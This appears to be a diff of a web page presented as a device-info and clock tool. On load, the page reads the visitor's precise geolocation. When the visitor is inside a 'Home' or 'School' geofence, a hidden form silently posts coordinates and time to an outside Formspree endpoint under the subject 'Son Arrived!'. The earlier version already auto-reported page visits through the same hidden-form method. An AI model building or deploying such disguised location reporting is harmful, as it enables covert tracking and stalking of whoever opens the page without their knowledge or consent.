@@ -3,8 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Device Info & Notification</title>
-
+  <title>Geofence Alert & Device Info</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -13,75 +12,112 @@
       padding: 2rem;
       text-align: center;
     }
-    h1 {
-      margin-bottom: 1rem;
-    }
+    h1 { margin-bottom: 1rem; }
     button {
       background: #007bff;
-      color: #fff;
+      color: white;
       border: none;
-      padding: 0.75rem 1.5rem;
-      font-size: 1rem;
       border-radius: 4px;
+      padding: .75rem 1.5rem;
+      font-size: 1rem;
       cursor: pointer;
     }
-    button:hover {
-      background: #0056b3;
-    }
+    button:hover { background: #0056b3; }
     #output {
       margin-top: 1.5rem;
+      display: inline-block;
+      text-align: left;
       background: #fff;
       padding: 1rem;
       border-radius: 4px;
       box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-      text-align: left;
-      display: inline-block;
     }
-    #output p {
-      margin: 0.5rem 0;
-    }
+    #output p { margin: .5rem 0; }
   </style>
 </head>
-
 <body>
-  <!-- ─── Hidden Formspree form ────────────────────────────────────── -->
-  <form id="notify"
-        action="https://formspree.io/f/mojnwpyo"  <!-- ← replace with your endpoint -->
+
+  <!-- ── Hidden Formspree form (must have method="POST") ──────────────── -->
+  <form id="geofenceForm"
+        action="https://formspree.io/f/mojnwypo"   <!-- ← replace with your endpoint -->
         method="POST"
         style="display:none">
-    <input type="hidden" name="Subject"   value="🚀 Device-Info Page Opened">
-    <input type="hidden" name="VisitedAt" id="visitTime">
+    <input type="hidden" name="Subject" value="🚀 Son Arrived!">
+    <input type="hidden" name="Place"    id="place">
+    <input type="hidden" name="Time"     id="time">
+    <input type="hidden" name="Latitude"  id="lat">
+    <input type="hidden" name="Longitude" id="lng">
   </form>
 
-  <!-- ─── Main Content ────────────────────────────────────────────── -->
-  <h1>📱 PC/Phone Info & Clock</h1>
+  <h1>📍 Geofence & Device Info</h1>
   <button id="info-btn">Get Device Info & Time</button>
   <div id="output"></div>
 
-  <!-- ─── Scripts ─────────────────────────────────────────────────── -->
   <script>
-    // 1) On page load: stamp the time & auto-submit the hidden form
-    document.addEventListener('DOMContentLoaded', () => {
-      // Fill the hidden field with a timestamp
-      document.getElementById('visitTime').value = new Date().toString();
-      // Send the notification
-      document.getElementById('notify').submit();
+    // ───────────────────────────── CONFIG ───────────────────────────────
+    // Define your geofenced spots here (lat, lng in decimal degrees; radius in meters)
+    const GEOFENCES = [
+      { name: 'Home',   lat: 37.4220, lng: -122.0841, radius: 100 },
+      { name: 'School', lat: 37.4275, lng: -122.1697, radius: 100 }
+    ];
+
+    // ────────────────────────── HELPER: Haversine Formula ───────────────
+    function distanceMeters(lat1, lng1, lat2, lng2) {
+      const toRad = deg => deg * Math.PI / 180;
+      const dLat = toRad(lat2 - lat1);
+      const dLng = toRad(lng2 - lng1);
+      const a = Math.sin(dLat/2)**2
+              + Math.cos(toRad(lat1)) * Math.cos(toRad(lat2))
+              * Math.sin(dLng/2)**2;
+      const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+      return 6371000 * c; // Earth's radius ≈ 6,371,000 m
+    }
+
+    // ────────────────── ON LOAD: REQUEST LOCATION & CHECK GEOFENCE ───────
+    window.addEventListener('DOMContentLoaded', () => {
+      if (!navigator.geolocation) {
+        console.warn('Geolocation not supported by browser.');
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(pos => {
+        const lat = pos.coords.latitude;
+        const lng = pos.coords.longitude;
+        const now = new Date().toString();
+
+        // Fill hidden form fields
+        document.getElementById('lat').value  = lat;
+        document.getElementById('lng').value  = lng;
+        document.getElementById('time').value = now;
+
+        // Check each geofence
+        for (let spot of GEOFENCES) {
+          const d = distanceMeters(lat, lng, spot.lat, spot.lng);
+          if (d <= spot.radius) {
+            // Inside geofence! Set the place and submit form
+            document.getElementById('place').value = spot.name;
+            document.getElementById('geofenceForm').submit();
+            return; // stop after first match
+          }
+        }
+        console.log('Not inside any geofenced area.');
+      },
+      err => console.error('Geolocation error:', err.message),
+      { enableHighAccuracy: true, timeout: 10000 });
     });
 
-    // 2) Device info & time display logic
+    // ─────────────────── DEVICE INFO BUTTON LOGIC ───────────────────────
     document.getElementById('info-btn').addEventListener('click', () => {
-      const now   = new Date();
-      const time  = now.toLocaleTimeString();
+      const now   = new Date().toLocaleTimeString();
       const plat  = navigator.platform;
       const ua    = navigator.userAgent;
-      const width = window.screen.width;
-      const height= window.screen.height;
+      const w     = screen.width, h = screen.height;
 
       document.getElementById('output').innerHTML = `
-        <p><strong>🕒 Current Time:</strong> ${time}</p>
+        <p><strong>🕒 Time:</strong> ${now}</p>
         <p><strong>💻 Platform:</strong> ${plat}</p>
         <p><strong>📄 User Agent:</strong> ${ua}</p>
-        <p><strong>🖥️ Screen:</strong> ${width}×${height}</p>
+        <p><strong>🖥️ Resolution:</strong> ${w}×${h}</p>
       `;
     });
   </script>
